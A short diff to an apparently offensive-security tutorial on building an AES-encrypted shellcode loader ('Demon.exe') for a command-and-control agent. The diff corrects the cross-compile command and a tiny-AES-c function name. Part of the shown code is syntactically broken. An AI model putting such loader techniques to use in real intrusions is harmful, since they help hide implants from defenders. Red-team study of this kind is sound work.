@@ -197,7 +197,7 @@ unsigned char payload[] = {
 Now that we have our code, let's compile it!
 
 ```shell
-x86_64-w64-mingw32-cc -I /Path/to/tiny-AES-c-1.0.0 -o Demon.exe Loader.cpp
+x86_64-w64-mingw32-gcc -I /Path/to/tiny-AES-c-1.0.0 -o Demon.exe Loader.cpp
 ```
 
 After transferring it to the Windows machine, I ran it and...the agent crashed. Great. After debugging it a bit, I have come to the conclusion that I also need to use tiny-aes-c for encryption. 
@@ -214,7 +214,7 @@ unsigned char iv[] {
 };
 
 AES_ctx ctx = {0};
-AES_ctx_init_iv(&ctx, key, iv);
+AES_init_ctx_iv(&ctx, key, iv);
 AES_CBC_encrypt_buffer(&ctx, payload, sizeof(payload));
 
 for(int i=0,i<sizeof(payload),i++) {
